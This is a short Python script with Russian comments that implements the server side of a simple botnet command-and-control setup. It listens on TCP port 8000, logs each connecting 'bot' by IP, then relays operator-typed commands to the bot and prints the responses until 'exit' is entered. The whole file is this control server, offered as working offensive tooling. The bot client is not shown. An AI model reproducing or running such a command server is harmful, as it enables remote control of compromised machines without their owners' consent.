import socketserver

class BotHandler(socketserver.BaseRequestHandler):
        #Метод для обработки и отправки запросов
	def handle(self):
		print("Bot with IP {} has been conected".format(self.client_address[0]))
		#Проверка связи
		self.data = self.request.recv(1024).strip()
		print("Bot with IP {} sent:".format(self.client_address[0]))
		print(self.data)
		#Отправляем команды
		self.command = ""
		while self.command != "exit":
			self.command = input("Please enter a command: ")
			self.request.sendall(bytes(self.command, "utf-8"))
			#Получаем ответ
			self.data = self.request.recv(1024).strip()
			print("Response from IP {} : ".format(self.client_address[0]))
			print(self.data)
			
if __name__ == "__main__":
	print("Server has been started")
	HOST, PORT = "", 8000
	#Создаем сервак 
	tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
	try:
                #Подрубаем сервак, каждое новое подключение создаст новый экземпляр класса BotHandler
		tcpServer.serve_forever()
	except:
		print("That was an error")
